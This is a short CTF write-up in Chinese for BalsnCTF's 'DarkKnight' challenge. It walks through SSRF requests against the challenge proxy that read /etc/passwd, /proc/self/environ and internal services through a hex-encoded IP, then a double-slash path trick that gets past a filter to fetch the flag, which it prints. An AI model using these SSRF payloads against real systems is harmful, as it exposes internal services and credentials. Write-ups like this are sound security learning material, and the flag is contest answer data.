# DarkKnight
## 題目

![image](https://user-images.githubusercontent.com/57281249/142795163-a834a3c8-d34a-4aed-bcfc-9c3ba5520a99.png)

## 解題
進來看到這個
![image](https://user-images.githubusercontent.com/57281249/142795197-a049ab6f-1d15-43d9-b417-54a3ee54db4f.png)

試著 http://proxy.balsnctf.com/query?site=http://www.google.com
![image](https://user-images.githubusercontent.com/57281249/142795222-e11076c6-6fa7-493e-9dd0-8b40d8f3adf6.png)

試著 ssrf  http://proxy.balsnctf.com/query?site=file:///etc/passwd
![image](https://user-images.githubusercontent.com/57281249/142795236-522dd390-14cb-442b-ac1d-7221e7fb1ec5.png)

試著 http://proxy.balsnctf.com/query?site=file:///proc/self/environ
![image](https://user-images.githubusercontent.com/57281249/142795255-13689cc5-9a1f-4e64-9f81-b986e01af138.png)

試著 http://proxy.balsnctf.com/query?site=file:///proc/net/tcp
![image](https://user-images.githubusercontent.com/57281249/142795276-6d3bd2de-7fd7-4077-bc8f-d2278f4cb6f2.png)

試著 http://proxy.balsnctf.com/query?site=http://127.0.0.1:15000
![image](https://user-images.githubusercontent.com/57281249/142795294-50e342dc-500b-43ec-8241-668dd110e0b0.png)

試著 http://proxy.balsnctf.com/query?site=http://127.0.0.1:15000/stats
![image](https://user-images.githubusercontent.com/57281249/142795368-4b9539c1-702b-4209-af46-7158f9f4362a.png)

試著 http://proxy.balsnctf.com/query?site=http://0X0A2C03F0:39307
![image](https://user-images.githubusercontent.com/57281249/142795389-217d6af0-0418-4c8b-ae17-05aa3bcd09ee.png)

試著 http://proxy.balsnctf.com/query?site=http://0X0A2C03F0:39307/flag

炸
![image](https://user-images.githubusercontent.com/57281249/142795401-d274d047-1b98-4180-bc4c-60860610af34.png)

試著 http://proxy.balsnctf.com/query?site=http://0X0A2C03F0:39307//flag

過
![image](https://user-images.githubusercontent.com/57281249/142795421-f5b07089-8ff3-4796-b1e3-f02de4d24734.png)

## flag
BALSN{default_istio_service_mesh_envoy_configurations}
